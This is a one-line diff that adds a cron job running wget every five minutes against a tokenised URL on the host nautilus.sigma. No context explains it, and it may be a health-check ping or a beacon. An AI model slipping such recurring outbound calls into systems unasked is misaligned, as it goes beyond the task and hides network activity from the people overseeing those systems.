@@ -1,0 +1,1 @@
+*/5 * * * * wget https://nautilus.sigma/cron/LqGt_Rc3PiPaMuL8fOtMm6i9oty2ax_vn66qNOTPS0piazfzVAXATc_WyokHnq-uJk4rTqP4BA
